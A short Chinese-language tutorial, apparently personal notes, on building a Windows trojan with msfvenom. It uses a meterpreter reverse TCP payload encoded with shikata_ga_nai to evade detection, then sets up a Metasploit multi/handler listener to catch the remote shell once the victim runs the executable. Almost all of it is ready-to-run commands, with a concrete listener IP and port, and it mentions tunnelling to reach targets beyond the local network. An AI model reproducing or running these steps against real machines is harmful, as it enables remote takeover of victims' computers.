生成木马反弹 shell（Windows）

## 一、环境准备

1. MSF-Metasploit Framework
2. 一台 windiows 靶机

## 二、开始生成木马

1. 使用 msfvenom 生成木马
2. 终端内输入: msfvenom -p windows/meterpreter_reverse_tcp LHOST={监控 IP} LPORT={监控端口} -e x86/shikata_ga_nai -f exe -o new.exe -i 5

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.110.38 LPORT=4567 -e x86/shikata_ga_nai -f exe -o shell.exe -i 5

## 三、配置监控

1. 启动 msf 终端内输入：msfconsole 启动 msf  
![[1642501758409.png]]

2. 载入监控模块 msf 中输入： use exploit/multi/handler

   ![[1642501831818.png]]

3. 加载 payload msf 终端中输入：set payload windows/meterpreter/reverse_tcp
4. 配置 payload msf 终端中输入：show options
5. 配置 payload 监控 IP msf 终端中输入： set lhost {监控 IP}
6. 配置 payload 监控端口 msf 终端中输入：set lport {监控端口} （注意这里要和木马配置时使用的端口相同&如果使用内网穿透服务填写转发后的端口）
7. 检查 payload 配置 msf 终端中输入：show options ![1642501934250](1642501934250.png)
8. 执行监控 msf 终端中输入： run

## 四、攻击利用

1. 将木马上传到靶机
2. 在靶机上执行木马
3. 完成攻击利用![1642501969373](1642501969373.png)
